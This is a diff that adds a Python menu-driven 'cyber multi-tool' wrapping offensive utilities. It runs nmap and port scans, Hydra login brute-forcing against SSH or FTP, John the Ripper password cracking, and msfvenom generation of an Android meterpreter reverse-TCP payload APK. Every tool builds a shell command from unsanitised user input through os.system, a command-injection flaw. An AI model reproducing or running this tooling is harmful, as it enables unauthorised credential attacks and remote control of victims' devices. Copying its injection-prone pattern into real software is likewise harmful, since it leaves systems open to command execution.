@@ -1,0 +1,151 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import socket
+import requests
+from termcolor import colored
+from time import sleep
+
+# Advanced Christmas Banner
+def banner():
+    os.system("clear")
+    print(colored(r"""
+     🎄🎅 XMAS ULTIMATE CYBER MULTI-TOOL 🎅🎄
+    -----------------------------------------
+        Network | Penetration | Automation  
+               Merry Hacking!
+    """, "red", attrs=["bold"]))
+
+# Main Menu
+def main_menu():
+    print(colored("\n[1] Network Tools", "green"))
+    print(colored("[2] Penetration Tools", "yellow"))
+    print(colored("[3] Automation Scripts", "cyan"))
+    print(colored("[4] Encryption Utilities", "magenta"))
+    print(colored("[5] Exit", "red"))
+
+# NETWORK TOOLS
+def network_tools():
+    print(colored("\n[Network Tools]", "green"))
+    print("[1] Nmap Scan")
+    print("[2] Port Scanner")
+    print("[3] Whois Lookup")
+    print("[4] Traceroute")
+    print("[5] Ping")
+    
+    choice = input("\nChoose a tool: ")
+    
+    if choice == '1':
+        target = input("Enter target IP/Domain: ")
+        os.system(f"nmap -sS -Pn {target}")
+    elif choice == '2':
+        port_scanner()
+    elif choice == '3':
+        domain = input("Enter domain: ")
+        os.system(f"whois {domain}")
+    elif choice == '4':
+        host = input("Enter host: ")
+        os.system(f"traceroute {host}")
+    elif choice == '5':
+        host = input("Enter host to ping: ")
+        os.system(f"ping -c 4 {host}")
+    else:
+        print("Invalid choice!")
+
+def port_scanner():
+    target = input("Enter target IP: ")
+    print(colored(f"Scanning {target}...", "yellow"))
+    for port in range(1, 65536):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.1)
+        if not s.connect_ex((target, port)):
+            print(colored(f"Port {port} is OPEN", "green"))
+        s.close()
+
+# PENETRATION TOOLS
+def penetration_tools():
+    print(colored("\n[Penetration Testing Tools]", "yellow"))
+    print("[1] Hydra Brute Force")
+    print("[2] Metasploit Launcher")
+    print("[3] Password Cracker (John)")
+    
+    choice = input("Choose a tool: ")
+    
+    if choice == '1':
+        target_ip = input("Enter target IP: ")
+        service = input("Service (e.g., ssh, ftp): ")
+        userlist = input("Path to userlist: ")
+        passlist = input("Path to passlist: ")
+        os.system(f"hydra -L {userlist} -P {passlist} {target_ip} {service}")
+    elif choice == '2':
+        print(colored("Launching Metasploit...", "red"))
+        os.system("msfconsole")
+    elif choice == '3':
+        wordlist = input("Enter path to wordlist: ")
+        hash_file = input("Enter path to hashed passwords: ")
+        os.system(f"john --wordlist={wordlist} {hash_file}")
+    else:
+        print("Invalid choice!")
+
+# AUTOMATION SCRIPTS
+def automation_scripts():
+    print(colored("\n[Automation Scripts]", "cyan"))
+    print("[1] Download Web Files")
+    print("[2] Generate Payload")
+    
+    choice = input("Choose an option: ")
+    
+    if choice == '1':
+        url = input("Enter URL to download files: ")
+        os.system(f"wget -r {url}")
+    elif choice == '2':
+        ip = input("Enter your IP: ")
+        port = input("Enter port: ")
+        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > payload.apk")
+        print(colored("Payload generated: payload.apk", "green"))
+    else:
+        print("Invalid choice!")
+
+# ENCRYPTION UTILITIES
+def encryption_utilities():
+    print(colored("\n[Encryption Utilities]", "magenta"))
+    print("[1] Encrypt File")
+    print("[2] Decrypt File")
+    
+    choice = input("Choose an option: ")
+    filepath = input("Enter file path: ")
+    
+    if choice == '1':
+        os.system(f"openssl enc -aes-256-cbc -salt -in {filepath} -out {filepath}.enc")
+        print(colored("File encrypted successfully!", "green"))
+    elif choice == '2':
+        os.system(f"openssl enc -d -aes-256-cbc -in {filepath} -out {filepath[:-4]}")
+        print(colored("File decrypted successfully!", "green"))
+    else:
+        print("Invalid choice!")
+
+# MAIN PROGRAM LOOP
+def main():
+    while True:
+        banner()
+        main_menu()
+        choice = input("\nChoose an option: ")
+        
+        if choice == '1':
+            network_tools()
+        elif choice == '2':
+            penetration_tools()
+        elif choice == '3':
+            automation_scripts()
+        elif choice == '4':
+            encryption_utilities()
+        elif choice == '5':
+            print(colored("Goodbye! Merry Christmas and Happy Hacking!", "red"))
+            sys.exit()
+        else:
+            print(colored("Invalid choice. Try again!", "red"))
+        input("\nPress Enter to continue...")
+
+if __name__ == "__main__":
+    main()
